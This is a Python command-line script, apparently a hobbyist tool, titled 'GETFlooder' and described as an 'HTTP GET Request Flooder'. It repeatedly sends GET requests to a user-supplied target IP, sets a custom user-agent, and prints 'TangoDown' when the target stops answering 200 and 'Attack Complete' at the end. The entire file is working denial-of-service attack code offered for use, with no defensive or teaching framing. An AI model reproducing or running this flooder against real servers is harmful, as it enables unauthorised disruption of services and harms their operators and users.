import requests
import argparse
import time

print("""

   __________________________                __         
  / ____/ ____/_  __/ ____/ /___  ____  ____/ /__  _____
 / / __/ __/   / / / /_  / / __ \/ __ \/ __  / _ \/ ___/
/ /_/ / /___  / / / __/ / / /_/ / /_/ / /_/ /  __/ /    
\____/_____/ /_/ /_/   /_/\____/\____/\__,_/\___/_/     
                                                        
ver 2.5.12.2020
// Added support for arguments
by
NoDisassemble

""")

parser = argparse.ArgumentParser(description="HTTP GET Request Flooder")
parser.add_argument('-t', '--target', type=str, metavar="", required=True, help="[Required] IP of the Target")
parser.add_argument('-r', '--rounds', type=int, metavar="", required=True, help="[Required] Number of Requests to Send")
parser.add_argument('-m', '--message', type=str, metavar="", required=False, help="[Optional] Message sent with GET Request")
args = parser.parse_args()
#args_str = " ".join(args.message)

count = 1
print("""
====================================
[!] Flooding Target: """ + str(args.target) + """
====================================
""")
time.sleep(1)
while count < int(args.rounds) + 1:
    print("["+ str(count)+"] Flooding " + str(args.target))
    r = requests.get('http://' + args.target, headers={'user-agent': args.message})
    print("[+] " + str(r.status_code))
    count += 1
#    time.sleep(1)
    if r.status_code != 200:
        print("[!] TangoDown")
        continue
    else:
        continue
print("""
====================================
[!] Attack Complete
====================================
""")
